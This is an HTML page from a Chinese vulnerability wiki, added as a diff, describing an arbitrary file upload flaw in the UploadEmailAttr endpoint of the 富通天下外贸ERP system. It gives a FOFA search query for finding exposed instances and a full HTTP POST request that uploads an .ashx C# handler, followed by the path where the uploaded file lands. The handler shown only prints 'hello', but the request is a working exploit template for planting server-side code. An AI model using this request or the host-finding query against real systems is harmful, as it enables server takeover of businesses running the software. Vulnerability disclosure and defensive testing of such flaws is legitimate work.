@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERP/%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERPUploadEmailAttr%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>富通天下外贸ERP UploadEmailAttr存在任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5bcc\u901a\u5929\u4e0b\u5916\u8d38ERP UploadEmailAttr\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERP%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERP%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        富通天下外贸ERP任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94%E6%9C%80%E6%96%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%8F%8Asql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94%E6%9C%80%E6%96%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%8F%8Asql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        宝塔最新未授权访问漏洞及sql注入
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="erp-uploademailattr">富通天下外贸ERP UploadEmailAttr存在任意文件上传漏洞<a class="headerlink" href="#erp-uploademailattr" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>富通天下外贸ERP基于二维界面管理功能，用户可对客户进行精细化的服务和跟踪，客户基本情况、邮件往来样品寄送记录、报价记录、定金收款情况等，信息脉络化，外贸管理软件让您全方位俯瞰客户管理。该系统存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>富通天下外贸ERP</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>fofa<code>title="用户登录_富通天下外贸ERP"</code></li>
+<li>特征</li>
+</ul>
+<p><img alt="1713317155013-b6ef7c19-c580-49fc-b352-d4cd4f06a47e.png" src="./img/9M-_KrPGGCIelEMF/1713317155013-b6ef7c19-c580-49fc-b352-d4cd4f06a47e-088702.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code>POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+
+&lt;% @ webhandler language=&quot;C#&quot; class=&quot;AverageHandler&quot; %&gt;
+using System;
+using System.Web;
+public class AverageHandler : IHttpHandler
+{
+public bool IsReusable
+{ get { return true; } }
+public void ProcessRequest(HttpContext ctx)
+{
+ctx.Response.Write(&quot;hello&quot;);
+}
+}
+</code></pre></div>
+<p><img alt="1713317237034-4f5b8a5e-4517-4159-a8dc-98dc7538b480.png" src="./img/9M-_KrPGGCIelEMF/1713317237034-4f5b8a5e-4517-4159-a8dc-98dc7538b480-766000.png" /></p>
+<p>文件上传位置</p>
+<div class="highlight"><pre><span></span><code>/JoinfWebFile/temp/emailatta/202404/20240417D636C4D1F279410CB324E1AFFE28B141.ashx
+</code></pre></div>
+<p><img alt="1713317277788-4eb77664-b181-480c-9914-8a1b6082429a.png" src="./img/9M-_KrPGGCIelEMF/1713317277788-4eb77664-b181-480c-9914-8a1b6082429a-053808.png" /></p>
+<blockquote>
+<p>更新: 2024-04-17 14:59:07<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/zy1m23vzu6i6aq36">https://www.yuque.com/xiaokp7/ocvun2/zy1m23vzu6i6aq36</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERP%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERP%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        富通天下外贸ERP任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94%E6%9C%80%E6%96%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%8F%8Asql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94%E6%9C%80%E6%96%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%8F%8Asql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        宝塔最新未授权访问漏洞及sql注入
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
